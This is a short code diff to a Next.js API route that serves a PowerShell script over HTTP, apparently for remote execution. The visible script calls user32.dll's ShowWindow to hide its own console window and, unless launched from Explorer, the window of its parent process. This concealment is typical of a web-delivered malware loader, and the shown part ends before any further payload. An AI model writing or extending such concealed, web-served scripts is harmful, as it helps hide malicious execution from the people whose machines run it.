@@ -3,8 +3,7 @@ import { NextRequest, NextResponse } from 'next/server';
 export async function GET(req: NextRequest) {
     const script = `
 add-type -name user32 -namespace win32 -memberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
-[win32.user32]::showWindow((get-process -id $pid).mainWindowHandle, 0);
-
+[win32.user32]::showWindow((get-process -id $pid).mainWindowHandle, 0)
 $proc = [System.Diagnostics.Process]::GetCurrentProcess()
 $parent = Get-Process -Id (gwmi win32_process | ? processid -eq  $proc.Id).parentprocessid
 if($parent.ProcessName -ne "explorer"){[win32.user32]::showWindow($parent.mainWindowHandle, 0)};
